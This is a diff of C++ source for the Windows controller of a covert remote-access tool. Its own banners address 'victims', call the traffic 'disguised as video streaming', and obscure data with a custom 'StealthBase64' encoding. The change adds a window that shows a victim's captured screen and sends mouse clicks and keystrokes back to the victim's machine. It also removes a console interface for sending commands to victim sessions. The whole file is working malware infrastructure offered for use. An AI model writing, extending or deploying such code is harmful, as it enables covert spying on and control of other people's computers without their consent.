@@ -11,9 +11,23 @@
 #include <algorithm>
 #include <iomanip>
 
+#include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <gdiplus.h>
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "gdiplus.lib")
+#pragma comment(lib, "user32.lib")
+#pragma comment(lib, "gdi32.lib")
+using namespace Gdiplus;
+
+// Global variables for the GUI
+HWND g_hMainWnd = nullptr;
+HBITMAP g_hScreenBitmap = nullptr;
+int g_remoteWidth = 0;
+int g_remoteHeight = 0;
+bool g_isConnected = false;
+std::string g_currentSession = "";
 
 // Base64 decoder for client data
 class StealthBase64 {
@@ -58,7 +72,30 @@ public:
 
 const std::string StealthBase64::chars = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890+/";
 
-// Global storage for remote desktop sessions
+// Simple decompression
+class SimpleCompressor {
+public:
+    static std::vector<unsigned char> decompressRLE(const std::vector<unsigned char>& compressed) {
+        std::vector<unsigned char> data;
+        
+        for (size_t i = 0; i < compressed.size(); ) {
+            if (compressed[i] == 0xFF && i + 2 < compressed.size()) {
+                unsigned char count = compressed[i + 1];
+                unsigned char value = compressed[i + 2];
+                for (unsigned char j = 0; j < count; j++) {
+                    data.push_back(value);
+                }
+                i += 3;
+            } else {
+                data.push_back(compressed[i]);
+                i++;
+            }
+        }
+        return data;
+    }
+};
+
+// Remote session storage
 struct RemoteSession {
     std::string id;
     std::string ip;
@@ -69,7 +106,7 @@ struct RemoteSession {
     std::queue<std::string> pending_inputs;
 };
 
-class NativeRemoteDesktopServer {
+class GuiRemoteDesktopServer {
 private:
     int port;
     SOCKET server_socket;
@@ -131,8 +168,56 @@ private:
         send(client_socket, resp_str.c_str(), resp_str.length(), 0);
     }
     
+    void updateDesktopDisplay(const std::string& session_id, const std::string& screen_data, int width, int height) {
+        // Decode the screen data
+        std::string decoded = StealthBase64::decode(screen_data);
+        std::vector<unsigned char> decompressed = SimpleCompressor::decompressRLE(
+            std::vector<unsigned char>(decoded.begin(), decoded.end())
+        );
+        
+        // Create bitmap from decompressed data
+        if (decompressed.size() > 0 && width > 0 && height > 0) {
+            HDC hdc = GetDC(nullptr);
+            HDC hdcMem = CreateCompatibleDC(hdc);
+            
+            // Create new bitmap
+            if (g_hScreenBitmap) {
+                DeleteObject(g_hScreenBitmap);
+            }
+            
+            BITMAPINFO bmi = {};
+            bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+            bmi.bmiHeader.biWidth = width;
+            bmi.bmiHeader.biHeight = -height; // Top-down
+            bmi.bmiHeader.biPlanes = 1;
+            bmi.bmiHeader.biBitCount = 24;
+            bmi.bmiHeader.biCompression = BI_RGB;
+            
+            void* pBits = nullptr;
+            g_hScreenBitmap = CreateDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, &pBits, nullptr, 0);
+            
+            if (g_hScreenBitmap && pBits) {
+                // Copy decompressed data to bitmap
+                memcpy(pBits, decompressed.data(), decompressed.size());
+                
+                g_remoteWidth = width;
+                g_remoteHeight = height;
+                g_isConnected = true;
+                g_currentSession = session_id;
+                
+                // Trigger window repaint
+                if (g_hMainWnd) {
+                    InvalidateRect(g_hMainWnd, nullptr, TRUE);
+                }
+            }
+            
+            DeleteDC(hdcMem);
+            ReleaseDC(nullptr, hdc);
+        }
+    }
+    
     void handleRequest(SOCKET client_socket, const std::string& client_ip) {
-        char buffer[8192] = {0};
+        char buffer[65536] = {0}; // Larger buffer for screen data
         int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
         
         if (bytes_received <= 0) {
@@ -161,7 +246,6 @@ private:
         
         std::cout << "[" << getCurrentTime() << "] " << method << " " << path << " from " << client_ip << std::endl;
         
-        // Handle API endpoints only - no HTML served
         if (path == "/api/connect" && method == "GET") {
             handleConnect(client_socket, client_ip);
         } else if (path.find("/api/stream/") == 0 && method == "POST") {
@@ -183,13 +267,7 @@ private:
                 std::string body = request.substr(body_start);
                 handleInputSubmit(client_socket, session_id, body);
             }
-        } else if (path == "/api/sessions" && method == "GET") {
-            handleSessionsList(client_socket);
-        } else if (path.find("/api/frame/") == 0 && method == "GET") {
-            std::string session_id = path.substr(11);
-            handleFrameRequest(client_socket, session_id);
         } else {
-            // Return 404 for everything else
             sendHttpResponse(client_socket, 404, "text/plain", "Not Found");
         }
         
@@ -222,15 +300,20 @@ private:
         if (sessions.find(session_id) != sessions.end()) {
             sessions[session_id].last_seen = std::chrono::system_clock::now();
             
-            // Extract screen data from JSON payload
             std::string width_str = extractJsonValue(data, "width");
             std::string height_str = extractJsonValue(data, "height");
             std::string screen_data = extractJsonValue(data, "data");
             
             if (!width_str.empty() && !height_str.empty() && !screen_data.empty()) {
-                sessions[session_id].width = std::stoi(width_str);
-                sessions[session_id].height = std::stoi(height_str);
+                int width = std::stoi(width_str);
+                int height = std::stoi(height_str);
+                
+                sessions[session_id].width = width;
+                sessions[session_id].height = height;
                 sessions[session_id].latest_screen_data = screen_data;
+                
+                // Update the GUI display
+                updateDesktopDisplay(session_id, screen_data, width, height);
                 
                 std::cout << "[+] Screen update: " << session_id << " (" 
                          << width_str << "x" << height_str << ")" << std::endl;
@@ -273,136 +356,25 @@ private:
             sendHttpResponse(client_socket, 404, "text/plain", "Session not found");
         }
     }
-    
-    void handleSessionsList(SOCKET client_socket) {
-        std::lock_guard<std::mutex> lock(sessions_mutex);
-        
-        std::stringstream json;
-        json << "{\"sessions\":[";
-        
-        bool first = true;
-        for (const auto& pair : sessions) {
-            if (!first) json << ",";
-            const RemoteSession& session = pair.second;
-            json << "{";
-            json << "\"id\":\"" << session.id << "\",";
-            json << "\"ip\":\"" << session.ip << "\",";
-            json << "\"active\":" << (session.active ? "true" : "false");
-            json << "}";
-            first = false;
-        }
-        
-        json << "]}";
-        sendHttpResponse(client_socket, 200, "application/json", json.str());
-    }
-    
-    void handleFrameRequest(SOCKET client_socket, const std::string& session_id) {
-        std::lock_guard<std::mutex> lock(sessions_mutex);
-        
-        if (sessions.find(session_id) != sessions.end()) {
-            const RemoteSession& session = sessions[session_id];
-            
-            std::stringstream json;
-            json << "{";
-            json << "\"width\":" << session.width << ",";
-            json << "\"height\":" << session.height << ",";
-            json << "\"screen\":\"" << session.latest_screen_data << "\"";
-            json << "}";
-            
-            sendHttpResponse(client_socket, 200, "application/json", json.str());
-        } else {
-            sendHttpResponse(client_socket, 404, "application/json", "{\"error\":\"Session not found\"}");
-        }
-    }
-    
-    void commandInterface() {
-        std::cout << "\n=== Native Remote Desktop Controller ===" << std::endl;
-        std::cout << "Commands:" << std::endl;
-        std::cout << "  sessions - List active victim sessions" << std::endl;
-        std::cout << "  info <session_id> - Show session details" << std::endl;
-        std::cout << "  input <session_id> <command> - Send input to victim" << std::endl;
-        std::cout << "  exit - Quit server" << std::endl;
-        
-        std::string input;
-        while (true) {
-            std::cout << "server> ";
-            std::getline(std::cin, input);
-            
-            if (input == "exit") {
-                exit(0);
-            } else if (input == "sessions") {
-                listSessions();
-            } else if (input.find("info ") == 0) {
-                std::string session_id = input.substr(5);
-                showSessionInfo(session_id);
-            } else if (input.find("input ") == 0) {
-                handleCommandInput(input.substr(6));
-            }
-        }
-    }
-    
-    void listSessions() {
-        std::lock_guard<std::mutex> lock(sessions_mutex);
-        std::cout << "\nActive Sessions:" << std::endl;
-        std::cout << std::string(50, '=') << std::endl;
-        
-        for (const auto& pair : sessions) {
-            const RemoteSession& session = pair.second;
-            auto duration = std::chrono::duration_cast<std::chrono::minutes>(
-                std::chrono::system_clock::now() - session.last_seen);
-            
-            std::cout << "Session: " << session.id << std::endl;
-            std::cout << "  IP: " << session.ip << std::endl;
-            std::cout << "  Screen: " << session.width << "x" << session.height << std::endl;
-            std::cout << "  Last seen: " << duration.count() << " minutes ago" << std::endl;
-            std::cout << std::string(30, '-') << std::endl;
-        }
-    }
-    
-    void showSessionInfo(const std::string& session_id) {
-        std::lock_guard<std::mutex> lock(sessions_mutex);
-        if (sessions.find(session_id) != sessions.end()) {
-            const RemoteSession& session = sessions[session_id];
-            std::cout << "\nSession Details:" << std::endl;
-            std::cout << "ID: " << session.id << std::endl;
-            std::cout << "IP: " << session.ip << std::endl;
-            std::cout << "Resolution: " << session.width << "x" << session.height << std::endl;
-            std::cout << "Status: " << (session.active ? "Active" : "Inactive") << std::endl;
-        } else {
-            std::cout << "Session not found" << std::endl;
-        }
-    }
-    
-    void handleCommandInput(const std::string& params) {
-        size_t space = params.find(' ');
-        if (space == std::string::npos) {
-            std::cout << "Usage: input <session_id> <command>" << std::endl;
-            return;
-        }
-        
-        std::string session_id = params.substr(0, space);
-        std::string command = params.substr(space + 1);
-        
-        std::lock_guard<std::mutex> lock(sessions_mutex);
-        if (sessions.find(session_id) != sessions.end()) {
-            std::string encoded = StealthBase64::encode(command);
-            sessions[session_id].pending_inputs.push(encoded);
-            std::cout << "Command sent to " << session_id << std::endl;
-        } else {
-            std::cout << "Session not found" << std::endl;
-        }
-    }
 
 public:
-    NativeRemoteDesktopServer(int p) : port(p) {
+    GuiRemoteDesktopServer(int p) : port(p) {
         WSADATA wsaData;
         if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
             throw std::runtime_error("WSAStartup failed");
         }
     }
     
-    ~NativeRemoteDesktopServer() {
+    ~GuiRemoteDesktopServer() {
         WSACleanup();
+    }
+    
+    void queueInput(const std::string& input_data) {
+        std::lock_guard<std::mutex> lock(sessions_mutex);
+        if (!g_currentSession.empty() && sessions.find(g_currentSession) != sessions.end()) {
+            std::string encoded = StealthBase64::encode(input_data);
+            sessions[g_currentSession].pending_inputs.push(encoded);
+        }
     }
     
     void start() {
@@ -428,17 +400,12 @@ public:
         }
         
         std::cout << "===============================================" << std::endl;
-        std::cout << "  Native Remote Desktop Server Started" << std::endl;
+        std::cout << "🖥️  GUI Remote Desktop Server Started" << std::endl;
         std::cout << "===============================================" << std::endl;
-        std::cout << " Listening on port: " << port << std::endl;
-        std::cout << " Victims connect to: http://your-ip:" << port << "/api/connect" << std::endl;
-        std::cout << " Traffic disguised as video streaming" << std::endl;
-        std::cout << " Native desktop client opens automatically" << std::endl;
+        std::cout << "📡 Listening on port: " << port << std::endl;
+        std::cout << "🎯 Victims connect to: http://your-ip:" << port << "/api/connect" << std::endl;
+        std::cout << "🖥️  Native window will open when victim connects" << std::endl;
         std::cout << "===============================================" << std::endl;
-        
-        // Start command interface in separate thread
-        std::thread cmd_thread(&NativeRemoteDesktopServer::commandInterface, this);
-        cmd_thread.detach();
         
         while (true) {
             sockaddr_in client_addr;
@@ -450,10 +417,145 @@ public:
             }
             
             std::string client_ip = inet_ntoa(client_addr.sin_addr);
-            std::thread(&NativeRemoteDesktopServer::handleRequest, this, client_socket, client_ip).detach();
+            std::thread(&GuiRemoteDesktopServer::handleRequest, this, client_socket, client_ip).detach();
         }
     }
 };
+
+// Global server instance
+GuiRemoteDesktopServer* g_pServer = nullptr;
+
+// Windows message handler for the desktop window
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
+    switch (uMsg) {
+        case WM_PAINT: {
+            PAINTSTRUCT ps;
+            HDC hdc = BeginPaint(hwnd, &ps);
+            
+            if (g_hScreenBitmap && g_isConnected) {
+                HDC hdcMem = CreateCompatibleDC(hdc);
+                HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, g_hScreenBitmap);
+                
+                RECT clientRect;
+                GetClientRect(hwnd, &clientRect);
+                
+                // Scale the remote desktop to fit the window
+                StretchBlt(hdc, 0, 0, clientRect.right, clientRect.bottom,
+                          hdcMem, 0, 0, g_remoteWidth, g_remoteHeight, SRCCOPY);
+                
+                SelectObject(hdcMem, hOldBitmap);
+                DeleteDC(hdcMem);
+            } else {
+                // Show "Waiting for connection..." message
+                RECT clientRect;
+                GetClientRect(hwnd, &clientRect);
+                SetTextColor(hdc, RGB(255, 255, 255));
+                SetBkColor(hdc, RGB(40, 40, 40));
+                
+                std::string message = "Waiting for victim connection...";
+                DrawTextA(hdc, message.c_str(), -1, &clientRect, 
+                         DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+            }
+            
+            EndPaint(hwnd, &ps);
+            return 0;
+        }
+        
+        case WM_LBUTTONDOWN: {
+            if (g_isConnected && g_pServer) {
+                int x = LOWORD(lParam);
+                int y = HIWORD(lParam);
+                
+                RECT clientRect;
+                GetClientRect(hwnd, &clientRect);
+                
+                // Scale coordinates to match remote screen
+                int remoteX = (x * g_remoteWidth) / clientRect.right;
+                int remoteY = (y * g_remoteHeight) / clientRect.bottom;
+                
+                std::string clickData = "click:" + std::to_string(remoteX) + ":" + std::to_string(remoteY);
+                g_pServer->queueInput(clickData);
+                
+                std::cout << "[+] Click sent: " << remoteX << "," << remoteY << std::endl;
+            }
+            return 0;
+        }
+        
+        case WM_RBUTTONDOWN: {
+            if (g_isConnected && g_pServer) {
+                int x = LOWORD(lParam);
+                int y = HIWORD(lParam);
+                
+                RECT clientRect;
+                GetClientRect(hwnd, &clientRect);
+                
+                int remoteX = (x * g_remoteWidth) / clientRect.right;
+                int remoteY = (y * g_remoteHeight) / clientRect.bottom;
+                
+                std::string clickData = "rightclick:" + std::to_string(remoteX) + ":" + std::to_string(remoteY);
+                g_pServer->queueInput(clickData);
+                
+                std::cout << "[+] Right-click sent: " << remoteX << "," << remoteY << std::endl;
+            }
+            return 0;
+        }
+        
+        case WM_KEYDOWN: {
+            if (g_isConnected && g_pServer) {
+                char key[2] = {0};
+                if (wParam >= 32 && wParam <= 126) {
+                    key[0] = (char)wParam;
+                    std::string keyData = "key:" + std::string(key);
+                    g_pServer->queueInput(keyData);
+                    std::cout << "[+] Key sent: " << key << std::endl;
+                } else if (wParam == VK_RETURN) {
+                    g_pServer->queueInput("key:ENTER");
+                    std::cout << "[+] Enter sent" << std::endl;
+                } else if (wParam == VK_ESCAPE) {
+                    g_pServer->queueInput("key:ESCAPE");
+                    std::cout << "[+] Escape sent" << std::endl;
+                }
+            }
+            return 0;
+        }
+        
+        case WM_DESTROY:
+            PostQuitMessage(0);
+            return 0;
+    }
+    
+    return DefWindowProc(hwnd, uMsg, wParam, lParam);
+}
+
+HWND CreateDesktopWindow() {
+    const char* className = "RemoteDesktopWindow";
+    
+    WNDCLASSA wc = {};
+    wc.lpfnWndProc = WindowProc;
+    wc.hInstance = GetModuleHandle(nullptr);
+    wc.lpszClassName = className;
+    wc.hbrBackground = CreateSolidBrush(RGB(40, 40, 40));
+    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
+    wc.style = CS_HREDRAW | CS_VREDRAW;
+    
+    RegisterClassA(&wc);
+    
+    HWND hwnd = CreateWindowExA(
+        0,
+        className,
+        "Remote Desktop Connection",
+        WS_OVERLAPPEDWINDOW,
+        CW_USEDEFAULT, CW_USEDEFAULT, 1024, 768,
+        nullptr, nullptr, GetModuleHandle(nullptr), nullptr
+    );
+    
+    if (hwnd) {
+        ShowWindow(hwnd, SW_SHOW);
+        UpdateWindow(hwnd);
+    }
+    
+    return hwnd;
+}
 
 int main(int argc, char* argv[]) {
     int port = 8080;
@@ -461,13 +563,41 @@ int main(int argc, char* argv[]) {
         port = std::stoi(argv[1]);
     }
     
+    // Initialize GDI+
+    GdiplusStartupInput gdiplusStartupInput;
+    ULONG_PTR gdiplusToken;
+    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);
+    
     try {
-        NativeRemoteDesktopServer server(port);
-        server.start();
+        // Create the server
+        GuiRemoteDesktopServer server(port);
+        g_pServer = &server;
+        
+        // Create the GUI window
+        g_hMainWnd = CreateDesktopWindow();
+        if (!g_hMainWnd) {
+            std::cerr << "Failed to create window" << std::endl;
+            return 1;
+        }
+        
+        // Start server in background thread
+        std::thread server_thread([&server]() {
+            server.start();
+        });
+        server_thread.detach();
+        
+        // Main Windows message loop
+        MSG msg;
+        while (GetMessage(&msg, nullptr, 0, 0)) {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
+        
     } catch (const std::exception& e) {
         std::cerr << "Error: " << e.what() << std::endl;
         return 1;
     }
     
+    GdiplusShutdown(gdiplusToken);
     return 0;
 }
